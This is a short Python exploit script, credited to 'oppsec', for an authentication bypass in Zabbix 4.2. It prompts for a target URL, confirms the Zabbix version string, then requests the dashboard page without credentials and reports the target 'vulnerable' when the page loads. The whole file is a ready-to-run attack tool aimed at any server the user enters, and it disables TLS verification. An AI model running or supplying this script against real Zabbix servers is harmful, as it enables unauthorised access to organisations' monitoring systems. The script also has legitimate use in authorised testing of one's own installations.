#!/usr/bin/python3
# author: oppsec
# credits: Milad Khoshdel

import requests
import os

from rich import print

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

banner = """[red]
    Zobbix | Zabbix 4.2 - Auth Bypass
            @opps3c[/]
"""

zabbix_text = "Zabbix 4.2.0"

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


def main():
    clear()
    print(banner)
    connection_check()


def connection_check():
    target_url = input(str(":: Insert target URL ~> "))

    try:
        response = requests.get(target_url, verify=False, timeout=5)
        status_code = response.status_code

        if(status_code == 200):
            print(f"[green]:: Connected succesfully with {target_url} | {status_code}[/]")
            version_check(target_url, response)
        else:
            return print(f"\n[red]:: Can't connect with {target_url} | {status_code}[/]")

    except requests.exceptions.ConnectionError:
        return print("\n[red]:: Connection error, please check the website URL.")
    except requests.exceptions.MissingSchema:
        return print("\n[red]:: Invalid URL, please check.")

def version_check(target_url, response):
    zabbix_path = f"{target_url}/zabbix.php?action=dashboard.view&dashboardid=1"

    path_request = requests.get(f"{zabbix_path}", verify=False, timeout=5)
    path_content = path_request.text

    if(zabbix_text in path_content):
        print(f"\n[green]:: Zabbix version confirmed | {zabbix_text} [/]")
        exploit(target_url, zabbix_path)
    else:
        return print("\n[red] Can't detect Zabbix, stopping the exploit...")


def exploit(target_url, zabbix_path):

    print(f"\n[yellow]:: Sending request to {target_url}[/]")

    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
        "Connection": "close"
    }

    response = requests.get(zabbix_path, verify=False, timeout=5, headers=headers)
    status_code = response.status_code
    response_content = response.text

    content_confirm = "Zabbix server health"

    if(status_code == 200 and content_confirm in response_content):
        print("\n[cyan]:: Bypassed auth, target is vulnerable.[/]")
        print(f"[cyan]:: URL: {zabbix_path}[/]")
    else:
        return print(f"\n[red]:: Can't bypass the auth, sorry... | {status_code}")


if __name__ == '__main__':
    main()